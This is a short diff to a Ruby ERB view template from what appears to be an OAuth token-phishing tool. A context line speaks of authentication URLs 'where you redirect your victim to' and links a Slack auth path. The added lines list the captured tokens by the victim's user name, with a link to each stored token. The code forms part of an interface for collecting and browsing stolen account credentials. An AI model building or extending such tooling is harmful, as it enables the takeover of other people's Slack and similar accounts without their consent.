@@ -5,3 +5,9 @@ This will list all valid authentication URLs (where you redirect your victim to)
 <h2>Authorization Paths</h2>
 <hr>
   <p><%=link_to("Slack",root_url+'auth/slack') %>
+
+<h2>Available Tokens</h2>
+<% @tokens.each do |token| %>
+  <% token.info = JSON.parse(token.info) %>
+  <p><%=link_to(token.info['user'], '/'+token.provider+"/"+token.id.to_s)%></p>
+<% end %>
